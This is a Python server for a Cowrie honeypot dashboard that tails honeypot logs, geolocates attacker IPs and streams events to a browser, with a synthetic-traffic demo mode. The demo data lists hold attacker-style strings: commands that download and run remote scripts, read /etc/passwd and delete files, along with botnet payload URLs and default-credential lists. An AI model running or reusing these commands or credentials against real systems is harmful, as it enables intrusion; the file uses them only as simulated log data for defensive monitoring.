#!/usr/bin/env python3
# SPDX-FileCopyrightText: 2026 The Cowtail Authors
# SPDX-License-Identifier: BSD-3-Clause
"""
Cowtail - a real-time web dashboard for the Cowrie honeypot.

Serves a static dashboard and streams `cowrie.json` events to the browser over
a WebSocket (no page polling / auto-refresh). Fully offline by default: all JS,
CSS, fonts and the world map are served locally, and attacker IPs are resolved
against a bundled DB-IP country database (drop a GeoLite2-City.mmdb in
data/ for city-level accuracy, or pass --online for ipwho.is fallback).

Usage:
    python server.py                          # tail ./cowrie.json
    COWRIE_LOG=var/log/cowrie/cowrie.json \
        python server.py                      # tail a live log
    python server.py --demo                   # stream synthetic traffic
"""

from __future__ import annotations

import argparse
import asyncio
import bisect
import ipaddress
import json
import os
import random
import sys
import time
import uuid
from array import array
from datetime import datetime, timezone
from pathlib import Path

import aiohttp
from aiohttp import web

BASE_DIR = Path(__file__).resolve().parent
STATIC_DIR = BASE_DIR / "static"
DATA_DIR = BASE_DIR / "data"

# --------------------------------------------------------------------------- #
# GeoIP data
# --------------------------------------------------------------------------- #

# Pre-seeded offline GeoIP used by demo mode (and as a fallback). A realistic,
# geographically diverse spread so the attack map looks alive without network.
DEMO_ATTACKERS = [
    ("185.220.101.34", "DE", "Germany", "Nuremberg", 49.4521, 11.0767),
    ("91.240.118.42", "RU", "Russia", "Moscow", 55.7558, 37.6173),
    ("45.155.205.99", "NL", "Netherlands", "Amsterdam", 52.3676, 4.9041),
    ("61.177.173.11", "CN", "China", "Suzhou", 31.2989, 120.5853),
    ("104.248.110.8", "US", "United States", "New York", 40.7128, -74.0060),
    ("167.99.220.19", "GB", "United Kingdom", "London", 51.5074, -0.1278),
    ("51.38.125.77", "FR", "France", "Roubaix", 50.6942, 3.1746),
    ("125.212.215.5", "VN", "Vietnam", "Hanoi", 21.0285, 105.8542),
    ("103.86.99.110", "KR", "South Korea", "Seoul", 37.5665, 126.9780),
    ("159.89.120.231", "SG", "Singapore", "Singapore", 1.3521, 103.8198),
    ("153.126.172.40", "JP", "Japan", "Tokyo", 35.6762, 139.6503),
    ("177.93.64.13", "BR", "Brazil", "Sao Paulo", -23.5505, -46.6333),
    ("187.188.44.66", "MX", "Mexico", "Mexico City", 19.4326, -99.1332),
    ("181.24.16.7", "AR", "Argentina", "Buenos Aires", -34.6037, -58.3816),
    ("103.231.91.21", "IN", "India", "Mumbai", 19.0760, 72.8777),
    ("36.66.120.90", "ID", "Indonesia", "Jakarta", -6.2088, 106.8456),
    ("182.52.129.44", "TH", "Thailand", "Bangkok", 13.7563, 100.5018),
    ("115.133.87.9", "MY", "Malaysia", "Kuala Lumpur", 3.1390, 101.6869),
    ("1.146.7.200", "AU", "Australia", "Sydney", -33.8688, 151.2093),
    ("41.203.96.19", "NG", "Nigeria", "Lagos", 6.5244, 3.3792),
    ("105.235.120.8", "ZA", "South Africa", "Johannesburg", -26.2041, 28.0473),
    ("197.162.10.77", "EG", "Egypt", "Cairo", 30.0444, 31.2357),
    ("5.101.40.5", "PL", "Poland", "Warsaw", 52.2297, 21.0122),
    ("95.216.30.118", "FI", "Finland", "Helsinki", 60.1699, 24.9384),
    ("178.62.4.9", "IT", "Italy", "Milan", 45.4642, 9.1900),
    ("176.31.100.44", "ES", "Spain", "Madrid", 40.4168, -3.7038),
    ("46.101.80.71", "TR", "Turkey", "Istanbul", 41.0082, 28.9784),
    ("193.37.69.210", "UA", "Ukraine", "Kyiv", 50.4501, 30.5234),
    ("116.62.11.5", "SE", "Sweden", "Stockholm", 59.3293, 18.0686),
    ("51.15.7.82", "CH", "Switzerland", "Zurich", 47.3769, 8.5417),
]

USERNAMES = [
    "root",
    "admin",
    "support",
    "user",
    "test",
    "guest",
    "pi",
    "ubuntu",
    "oracle",
    "postgres",
    "mysql",
    "deploy",
    "jenkins",
    "345gs5662d34",
    "default",
    "tech",
    "ftpuser",
    "nobody",
    "git",
    "elasticsearch",
]

PASSWORDS = [
    "123456",
    "password",
    "admin",
    "1234",
    "root",
    "toor",
    "vizxv",
    "xmhdipc",
    "12345",
    "1",
    "12345678",
    "default",
    "1111",
    "2222",
    "3333",
    "P@ssw0rd",
    "qwerty",
    "letmein",
    "0",
    "666666",
]

COMMANDS = [
    "enable",
    "shell",
    "sh",
    "system",
    "linuxshell",
    "busybox",
    "cat /proc/cpuinfo",
    "uname -a",
    "cd /tmp",
    "wget http://185.244.25.189/bins.sh -O /tmp/x.sh",
    "curl -s http://80.211.169.146/x86",
    "busybox wget http://107.189.30.50/mips",
    "chmod 777 /tmp/x.sh",
    "sh /tmp/x.sh",
    "rm -rf /var/tmp/*",
    "echo xsec",
    "cat /etc/passwd",
    "ifconfig",
    "netstat -an",
    "ps aux",
    "free -m",
    "reboot",
    "tftp -g -r mpsl 45.95.55.101",
]

SSH_VERSIONS = [
    "SSH-2.0-Go",
    "SSH-2.0-libssh-0.9.6",
    "SSH-2.0-OpenSSH_7.4",
    "SSH-2.0-JuiceSSH_3.2.2",
    "SSH-2.0-PUTTY",
    "SSH-2.0-dropbear_2020.81",
    "SSH-2.0-paramiko_2.11.0",
    "SSH-2.0-Go-http-client",
]

MALWARE_URLS = [
    "http://185.244.25.189/bins.sh",
    "http://80.211.169.146/x86",
    "http://107.189.30.50/mips",
    "http://45.95.55.101/mpsl",
    "http://51.38.191.19/x86_64",
    "http://185.165.29.46/k.sh",
    "http://91.189.91.43/v2.sh",
    "http://45.227.255.40/muhstik.arm7",
    "http://62.210.130.250/loligang",
    "http://146.88.240.4/mpsl",
    "http://107.172.99.71/gost",
    "http://62.113.233.181/1.sh",
]

VT_DETECTIONS = [
    ("kaspersky", "uds:backdoor.linux.gafgyt"),
    ("drweb", "linux.downloader.2650"),
    ("microsoft", "trojan:script/wacatac.c!ml"),
    ("eset-nod32", "linux/gafgyt.x"),
    ("clamav", "unix.trojan.mirai-6987434-0"),
    ("symantec", "linux.gafgyt"),
    ("fortinet", "linux/gafgyt.b!tr"),
    ("avast", "elf:gafgyt-b [trj]"),
    ("k7antivirus", "riskware (0040eff71)"),
    ("antiy-avl", "trojan[backdoor]/linux.gafgyt"),
    ("bitdefender", "gen:variant.graftor.918744"),
    ("mcafee", "linux/gafgyt.a"),
]

VT_CLEAN_ENGINES = [
    "bkav",
    "ctx",
    "alyac",
    "sangfor",
    "crowdstrike",
    "arcabit",
    "vipre",
    "trendmicro",
    "sophos",
    "google",
    "tencent",
    "zonealarm",
    "panda",
    "avg",
    "avira",
    "nano-antivirus",
    "superantispyware",
    "zillya",
]


def flag_emoji(country_code: str) -> str:
    """Turn an ISO-3166-1 alpha-2 code into a flag emoji."""
    if not country_code or country_code in ("XX", "??"):
        return "🏳️"
    try:
        return "".join(chr(0x1F1E6 + ord(c) - ord("A")) for c in country_code.upper())
    except (ValueError, TypeError):
        return "🏳️"


def is_private(ip: str) -> bool:
    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return True


def now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


# --------------------------------------------------------------------------- #
# GeoIP resolver
# --------------------------------------------------------------------------- #


def ip_to_int(ip: str) -> int | None:
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return None
    if addr.version != 4:
        return None
    return int(addr)


class CountryDB:
    """Offline IPv4 -> country database (DB-IP lite, CC-BY-4.0).

    Loads a numeric ``start,end,code`` CSV into arrays and binary-searches it.
    Country centroids for map plotting come from a bundled ``countries.json``.
    """

    def __init__(self, csv_path: Path, countries_path: Path):
        starts: list[int] = []
        ends: list[int] = []
        codes: list[str] = []
        with open(csv_path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    s, e, code = line.split(",", 2)
                    starts.append(int(s))
                    ends.append(int(e))
                    codes.append(code)
                except ValueError:
                    continue
        self._starts = array("I", starts)
        self._ends = array("I", ends)
        self._codes = codes
        self._countries = json.loads(countries_path.read_text(encoding="utf-8"))
        self.count = len(codes)

    def resolve(self, ip: str) -> dict | None:
        n = ip_to_int(ip)
        if n is None:
            return None
        i = bisect.bisect_right(self._starts, n) - 1
        if i < 0 or self._ends[i] < n:
            return None
        code = self._codes[i]
        meta = self._countries.get(code)
        if not meta:
            return None
        return {
            "ip": ip,
            "country": meta["name"],
            "country_code": code,
            "region": None,
            "city": None,
            "latitude": meta["lat"],
            "longitude": meta["lng"],
            "flag": flag_emoji(code),
            "isp": "",
        }


class GeoResolver:
    """Resolves attacker IPs to GeoIP records, fully offline by default.

    Resolution order: in-memory cache -> local MaxMind ``*.mmdb`` (city-level,
    if present and ``maxminddb`` installed) -> bundled DB-IP country database ->
    optional online ipwho.is fallback (only when ``--online`` is passed).
    """

    def __init__(
        self, demo: bool = False, online: bool = False, data_dir: Path = DATA_DIR
    ):
        self._cache: dict[str, dict] = {}
        self._demo = demo
        self._online = online
        self._session: aiohttp.ClientSession | None = None
        self._sem = asyncio.Semaphore(8)
        self._db: CountryDB | None = None
        self._mmdb = None

        if not demo:
            csv_path = data_dir / "geoip-country-ipv4.csv"
            countries_path = data_dir / "countries.json"
            if csv_path.exists() and countries_path.exists():
                try:
                    self._db = CountryDB(csv_path, countries_path)
                    print(
                        f"  geoip  : {self._db.count} IPv4 ranges loaded (offline DB-IP)"
                    )
                except Exception as exc:  # noqa: BLE001
                    print(f"  geoip  : failed to load country DB ({exc})")

            try:
                import maxminddb  # noqa: PLC0415
            except ImportError:
                maxminddb = None

            mmdb_files = sorted(data_dir.glob("*.mmdb"))
            if maxminddb is None:
                if mmdb_files:
                    print(
                        "  geoip  : found "
                        + ", ".join(f.name for f in mmdb_files)
                        + " but 'maxminddb' is not installed"
                    )
                    print("           -> pip install maxminddb  (city-level GeoIP)")
            else:
                for mmdb_file in mmdb_files:
                    try:
                        self._mmdb = maxminddb.open_database(str(mmdb_file))
                        print(f"  geoip  : using {mmdb_file.name} (city-level)")
                        break
                    except Exception as exc:  # noqa: BLE001
                        print(f"  geoip  : failed to open {mmdb_file.name} ({exc})")

    def seed(self, entries: list[tuple]) -> None:
        for ip, code, country, city, lat, lng in entries:
            self._cache[ip] = {
                "ip": ip,
                "country": country,
                "country_code": code,
                "city": city,
                "latitude": lat,
                "longitude": lng,
                "flag": flag_emoji(code),
                "isp": "SIMULATED",
            }

    def known(self, ip: str) -> dict | None:
        return self._cache.get(ip)

    async def resolve(self, ip: str) -> dict:
        if ip in self._cache:
            return self._cache[ip]
        if is_private(ip):
            geo = {
                "ip": ip,
                "country": "Private",
                "country_code": "XX",
                "city": "Local network",
                "latitude": None,
                "longitude": None,
                "flag": "🔒",
                "isp": "",
            }
            self._cache[ip] = geo
            return geo

        geo = self._resolve_local(ip)
        if geo is None and self._online:
            try:
                async with self._sem:
                    geo = await self._lookup_online(ip)
            except Exception:
                geo = None
        if geo is None:
            geo = self._unknown(ip)
        self._cache[ip] = geo
        return geo

    def _resolve_local(self, ip: str) -> dict | None:
        if self._mmdb is not None:
            try:
                rec = self._mmdb.get(ip)
                if rec:
                    geo = self._from_mmdb(ip, rec)
                    if geo is not None:
                        return geo
            except Exception:
                pass
        if self._db is not None:
            return self._db.resolve(ip)
        return None

    @staticmethod
    def _from_mmdb(ip: str, rec: dict) -> dict | None:
        country = rec.get("country") or {}
        city = rec.get("city") or {}
        loc = rec.get("location") or {}
        code = country.get("iso_code")
        lat = loc.get("latitude")
        lng = loc.get("longitude")
        if lat is None or lng is None:
            return None
        subs = rec.get("subdivisions") or [{}]
        return {
            "ip": ip,
            "country": (country.get("names") or {}).get("en") or code or "Unknown",
            "country_code": code or "XX",
            "region": (subs[0].get("names") or {}).get("en"),
            "city": (city.get("names") or {}).get("en"),
            "latitude": lat,
            "longitude": lng,
            "flag": flag_emoji(code or "XX"),
            "isp": "",
        }

    async def _lookup_online(self, ip: str) -> dict:
        if self._session is None:
            self._session = aiohttp.ClientSession()
        async with self._session.get(
            f"https://ipwho.is/{ip}",
            headers={"User-Agent": "cowtail/1.0"},
            timeout=aiohttp.ClientTimeout(total=6),
        ) as resp:
            data = await resp.json()
        if not data.get("success"):
            return self._unknown(ip)
        code = data.get("country_code") or "XX"
        return {
            "ip": ip,
            "country": data.get("country", "Unknown"),
            "country_code": code,
            "region": data.get("region"),
            "city": data.get("city"),
            "latitude": data.get("latitude"),
            "longitude": data.get("longitude"),
            "flag": flag_emoji(code),
            "isp": (data.get("connection") or {}).get("isp", ""),
        }

    @staticmethod
    def _unknown(ip: str) -> dict:
        return {
            "ip": ip,
            "country": "Unknown",
            "country_code": "XX",
            "city": None,
            "latitude": None,
            "longitude": None,
            "flag": "🏳️",
            "isp": "",
        }

    async def close(self) -> None:
        if self._session is not None:
            await self._session.close()
        if self._mmdb is not None:
            self._mmdb.close()


# --------------------------------------------------------------------------- #
# Synthetic traffic simulator (demo mode)
# --------------------------------------------------------------------------- #


class Simulator:
    """Emits a realistic, continuous stream of Cowrie-style events."""

    def __init__(self, rng: random.Random):
        self.rng = rng
        self.open_sessions: dict[str, dict] = {}
        self.pending_vt: list[dict] = []

    def _session_id(self) -> str:
        return f"{self.rng.getrandbits(40):010x}"

    def _attacker(self) -> tuple[str, str, str]:
        ip, _, _, _, _, _ = self.rng.choice(DEMO_ATTACKERS)
        protocol = self.rng.choice(["ssh", "ssh", "telnet"])
        port = "2222" if protocol == "ssh" else "2223"
        return ip, protocol, port

    def next_event(self) -> dict:
        if self.pending_vt and self.rng.random() < 0.55:
            return self._virustotal_scan()

        if not self.open_sessions or self.rng.random() < 0.28:
            return self._open_session()

        sid = self.rng.choice(list(self.open_sessions))
        sess = self.open_sessions[sid]
        if (
            sess["protocol"] == "ssh"
            and not sess.get("versioned")
            and self.rng.random() < 0.5
        ):
            sess["versioned"] = True
            return self._client_version(sess)

        roll = self.rng.random()
        if roll < 0.14:
            return self._close_session(sid)
        if roll < 0.48:
            return self._login_attempt(sess)
        if roll < 0.78:
            return self._command(sess)
        if roll < 0.92:
            return self._file_download(sess)
        return self._telnet_option(sess)

    def _open_session(self) -> dict:
        ip, protocol, port = self._attacker()
        sid = self._session_id()
        self.open_sessions[sid] = {
            "id": sid,
            "ip": ip,
            "protocol": protocol,
            "port": port,
            "src_port": self.rng.randint(1024, 65535),
            "versioned": False,
        }
        return self._connect(sid, ip, protocol, port)

    def _client_version(self, sess) -> dict:
        ev = self._base(
            sess["id"], sess["ip"], sess["protocol"], sess["port"], sess["src_port"]
        )
        ev["version"] = self.rng.choice(SSH_VERSIONS)
        ev["eventid"] = "cowrie.client.version"
        ev["message"] = f"Remote SSH version: {ev['version']}"
        return ev

    def _connect(self, sid, ip, protocol, port):
        sess = self.open_sessions[sid]
        ev = self._base(sid, ip, protocol, port, sess["src_port"])
        ev["eventid"] = "cowrie.session.connect"
        ev["message"] = (
            f"New connection: {ip}:{sess['src_port']} "
            f"(172.18.0.2:{port}) [session: {sid}]"
        )
        return ev

    def _login_attempt(self, sess) -> dict:
        ev = self._base(
            sess["id"], sess["ip"], sess["protocol"], sess["port"], sess["src_port"]
        )
        ev["username"] = self.rng.choice(USERNAMES)
        ev["password"] = self.rng.choice(PASSWORDS)
        if self.rng.random() < 0.42:
            ev["eventid"] = "cowrie.login.success"
            ev["message"] = (
                f"login attempt [{ev['username']}/{ev['password']}] succeeded"
            )
        else:
            ev["eventid"] = "cowrie.login.failed"
            ev["message"] = f"login attempt [{ev['username']}/{ev['password']}] failed"
        return ev

    def _command(self, sess) -> dict:
        ev = self._base(
            sess["id"], sess["ip"], sess["protocol"], sess["port"], sess["src_port"]
        )
        cmd = self.rng.choice(COMMANDS)
        ev["input"] = cmd
        if self.rng.random() < 0.12:
            ev["eventid"] = "cowrie.command.failed"
            ev["message"] = f"Command not found: {cmd}"
        else:
            ev["eventid"] = "cowrie.command.input"
            ev["message"] = f"CMD: {cmd}"
        return ev

    def _telnet_option(self, sess) -> dict:
        ev = self._base(
            sess["id"], sess["ip"], sess["protocol"], sess["port"], sess["src_port"]
        )
        ev["command"] = "WILL"
        ev["option_name"] = "NAWS"
        ev["option_byte"] = 31
        ev["eventid"] = "cowrie.telnet.option"
        ev["message"] = "Telnet WILL NAWS"
        return ev

    def _file_download(self, sess) -> dict:
        ev = self._base(
            sess["id"], sess["ip"], sess["protocol"], sess["port"], sess["src_port"]
        )
        url = self.rng.choice(MALWARE_URLS)
        ev["url"] = url
        if self.rng.random() < 0.08:
            ev["eventid"] = "cowrie.session.file_download.failed"
            ev["message"] = f"Attempt to download file(s) from URL ({url}) failed"
        else:
            shasum = "".join(self.rng.choices("0123456789abcdef", k=64))
            ev["eventid"] = "cowrie.session.file_download"
            ev["shasum"] = shasum
            ev["outfile"] = f"var/lib/cowrie/downloads/{shasum}"
            ev["duplicate"] = self.rng.random() < 0.2
            ev["message"] = f"Downloaded URL ({url}) with SHA-256 {shasum}"
            self.pending_vt.append(
                {
                    "session": sess["id"],
                    "ip": sess["ip"],
                    "protocol": sess["protocol"],
                    "port": sess["port"],
                    "src_port": sess["src_port"],
                    "shasum": shasum,
                }
            )
            if len(self.pending_vt) > 50:
                self.pending_vt = self.pending_vt[-50:]
        return ev

    def _virustotal_scan(self) -> dict:
        item = self.pending_vt.pop(0)
        ev = self._base(
            item["session"],
            item["ip"],
            item["protocol"],
            item["port"],
            item["src_port"],
        )
        ev["eventid"] = "cowrie.virustotal.scanfile"
        ev["sha256"] = item["shasum"]
        ev["total"] = 75
        if self.rng.random() < 0.18:
            # new sample, uploaded for scanning - no verdict yet
            ev["is_new"] = "true"
            ev["message"] = f"VT: New file {item['shasum']}"
        else:
            positives = self.rng.choice([0, 0, 1, 1, 2, 3, 3, 4, 5, 6])
            ev["positives"] = positives
            ev["scan_date"] = int(time.time())
            ev["is_new"] = "false"
            scans: dict[str, dict[str, str]] = {}
            detections = self.rng.sample(
                VT_DETECTIONS, min(positives, len(VT_DETECTIONS))
            )
            for engine, result in detections:
                scans[engine] = {"detected": "true", "result": result}
            for engine in self.rng.sample(VT_CLEAN_ENGINES, 8):
                if engine not in scans:
                    scans[engine] = {"detected": "false", "result": "none"}
            ev["scans"] = scans
            ev["message"] = (
                f"VT: Binary file with sha256 {item['shasum']} was found malicious "
                f"by {positives} out of 75 feeds (scanned on {ev['scan_date']})"
            )
        return ev

    def _close_session(self, sid) -> dict:
        sess = self.open_sessions.pop(sid)
        ev = self._base(sid, sess["ip"], sess["protocol"], sess["port"])
        dur = self.rng.randint(2000, 180000)
        ev["duration_ms"] = dur
        ev["eventid"] = "cowrie.session.closed"
        ev["message"] = f"Connection lost after {dur} milliseconds"
        return ev

    @staticmethod
    def _base(sid, ip, protocol, port, src_port=None) -> dict:
        if src_port is None:
            src_port = random.randint(1024, 65535)
        return {
            "session": sid,
            "protocol": protocol,
            "src_ip": ip,
            "src_port": src_port,
            "dst_ip": "172.18.0.2",
            "dst_port": port,
            "sensor": "demo-sensor",
            "uuid": str(uuid.uuid4()),
            "timestamp": now_iso(),
        }


# --------------------------------------------------------------------------- #
# Web application
# --------------------------------------------------------------------------- #


class CowrieMonitor:
    def __init__(
        self,
        log_path: Path,
        demo: bool = False,
        host: str = "127.0.0.1",
        port: int = 8080,
        online: bool = False,
    ):
        self.log_path = log_path
        self.demo = demo
        self.host = host
        self.port = port

        self.events: list[dict] = []
        self.clients: set[web.WebSocketResponse] = set()
        self.resolver = GeoResolver(demo=demo, online=online)
        if demo:
            self.resolver.seed(DEMO_ATTACKERS)
        self._pending_ips: set[str] = set()

        self.honeypot = {
            "lat": float(os.environ.get("HONEYPOT_LAT", "52.3676")),
            "lng": float(os.environ.get("HONEYPOT_LNG", "4.9041")),
            "label": os.environ.get("HONEYPOT_LABEL", "Honeypot"),
        }

        self._file_offset = 0
        self._pending_line = ""
        self._rng = random.Random()
        self._sim = Simulator(self._rng) if demo else None
        self._sensor = "demo-sensor" if demo else None

    # -- helpers ------------------------------------------------------------ #

    def _sensor_from_event(self, ev: dict) -> str:
        return ev.get("sensor", self._sensor or "unknown")

    # -- event pipeline ----------------------------------------------------- #

    def ingest_event(self, ev: dict, broadcast: bool = True) -> None:
        self.events.append(ev)
        if len(self.events) > 200_000:
            self.events = self.events[-100_000:]
        if not self._sensor or self._sensor == "demo-sensor":
            self._sensor = self._sensor_from_event(ev)
        if broadcast:
            ip = ev.get("src_ip")
            if ip:
                asyncio.create_task(self._resolve_and_broadcast(ip))
            asyncio.create_task(
                self._broadcast(
                    {
                        "type": "event",
                        "event": ev,
                        "geo": self.resolver.known(ev.get("src_ip")),
                    }
                )
            )

    async def _resolve_and_broadcast(self, ip: str) -> None:
        if ip in self._pending_ips or self.resolver.known(ip):
            return
        self._pending_ips.add(ip)
        try:
            geo = await self.resolver.resolve(ip)
            await self._broadcast({"type": "geo", "ip": ip, "geo": geo})
        finally:
            self._pending_ips.discard(ip)

    async def _ensure_geo_for_existing(self) -> None:
        seen = set()
        for ev in reversed(self.events):
            ip = ev.get("src_ip")
            if ip and ip not in seen:
                seen.add(ip)
                asyncio.create_task(self._resolve_and_broadcast(ip))

    # -- file tailing ------------------------------------------------------- #

    def load_initial(self) -> None:
        if self.demo or not self.log_path.exists():
            return
        try:
            with open(self.log_path, "r", encoding="utf-8", errors="replace") as f:
                for line in f:
                    self._parse_line(line, broadcast=False)
            self._file_offset = self.log_path.stat().st_size
        except OSError:
            pass

    def _parse_line(self, line: str, broadcast: bool) -> None:
        line = line.strip()
        if not line:
            return
        try:
            ev = json.loads(line)
        except json.JSONDecodeError:
            return
        self.ingest_event(ev, broadcast=broadcast)

    async def tail_loop(self) -> None:
        while True:
            await asyncio.sleep(0.5)
            try:
                size = self.log_path.stat().st_size
            except OSError:
                await asyncio.sleep(2)
                continue

            if size > self._file_offset:
                try:
                    with open(
                        self.log_path, "r", encoding="utf-8", errors="replace"
                    ) as f:
                        f.seek(self._file_offset)
                        chunk = f.read()
                except OSError:
                    continue
                self._file_offset += len(chunk)
                self._pending_line += chunk
                *complete, self._pending_line = self._pending_line.split("\n")
                for line in complete:
                    self._parse_line(line, broadcast=True)
            elif size < self._file_offset:
                self._file_offset = size
                self._pending_line = ""

    async def demo_loop(self) -> None:
        while True:
            ev = self._sim.next_event()
            self.ingest_event(ev, broadcast=True)
            await asyncio.sleep(self._rng.uniform(0.35, 1.6))

    # -- websocket ---------------------------------------------------------- #

    async def _broadcast(self, msg: dict) -> None:
        if not self.clients:
            return
        dead = []
        for ws in list(self.clients):
            if ws.closed:
                dead.append(ws)
                continue
            try:
                await ws.send_json(msg)
            except Exception:  # noqa: BLE001 - any send failure means a dead client
                dead.append(ws)
        for ws in dead:
            self.clients.discard(ws)

    def _snapshot_events(self) -> list[dict]:
        out = []
        for ev in self.events[-50_000:]:
            ev = dict(ev)
            ip = ev.get("src_ip")
            if ip:
                ev["geo"] = self.resolver.known(ip)
            out.append(ev)
        return out

    async def ws_handler(self, request: web.Request) -> web.WebSocketResponse:
        ws = web.WebSocketResponse(heartbeat=30, max_msg_size=8 * 1024 * 1024)
        await ws.prepare(request)
        self.clients.add(ws)
        try:
            snapshot = {
                "type": "snapshot",
                "mode": "demo" if self.demo else "live",
                "honeypot": self.honeypot,
                "sensor": self._sensor,
                "events": self._snapshot_events(),
            }
            await ws.send_json(snapshot)
            await self._ensure_geo_for_existing()

            async for msg in ws:
                if msg.type == aiohttp.WSMsgType.ERROR:
                    break
        finally:
            self.clients.discard(ws)
        return ws

    # -- http --------------------------------------------------------------- #

    async def index(self, request: web.Request) -> web.FileResponse:
        return web.FileResponse(STATIC_DIR / "index.html")

    def build_app(self) -> web.Application:
        app = web.Application()
        app.router.add_get("/", self.index)
        app.router.add_get("/ws", self.ws_handler)
        app.router.add_static("/static", STATIC_DIR, show_index=False)
        return app

    async def run(self) -> None:
        self.load_initial()
        runner = web.AppRunner(self.build_app())
        await runner.setup()
        site = web.TCPSite(runner, self.host, self.port)
        await site.start()

        tasks = [
            asyncio.create_task(self.demo_loop() if self.demo else self.tail_loop())
        ]
        if not self.demo:
            asyncio.create_task(self._ensure_geo_for_existing())

        url = f"http://{self.host}:{self.port}"
        print("=" * 62)
        print("  COWTAIL LIVE MONITOR")
        print(f"  mode   : {'SIMULATION' if self.demo else 'LIVE (tailing)'}")
        if not self.demo:
            print(f"  log    : {self.log_path}")
        print(f"  open   : {url}")
        print(f"  ws     : {url.replace('http', 'ws')}/ws")
        print("=" * 62)
        print("  Press Ctrl+C to stop.\n")

        try:
            await asyncio.gather(*tasks)
        finally:
            await runner.cleanup()
            await self.resolver.close()


def parse_args(argv: list[str]) -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Cowtail - Cowrie honeypot web dashboard")
    p.add_argument(
        "--log",
        default=os.environ.get("COWRIE_LOG", "cowrie.json"),
        help="Path to cowrie.json log to tail (default: $COWRIE_LOG or ./cowrie.json)",
    )
    p.add_argument(
        "--demo",
        action="store_true",
        help="Stream synthetic attack traffic (works fully offline)",
    )
    p.add_argument(
        "--host",
        default=os.environ.get("HOST", "127.0.0.1"),
        help="Bind address (default: 127.0.0.1)",
    )
    p.add_argument(
        "--port",
        type=int,
        default=int(os.environ.get("PORT", "8080")),
        help="Port (default: 8080)",
    )
    p.add_argument(
        "--online",
        action="store_true",
        help="Enable ipwho.is fallback for IPs missing from the offline DB",
    )
    return p.parse_args(argv)


def main() -> int:
    args = parse_args(sys.argv[1:])
    monitor = CowrieMonitor(
        log_path=Path(args.log),
        demo=args.demo,
        host=args.host,
        port=args.port,
        online=args.online,
    )
    try:
        asyncio.run(monitor.run())
    except KeyboardInterrupt:
        pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
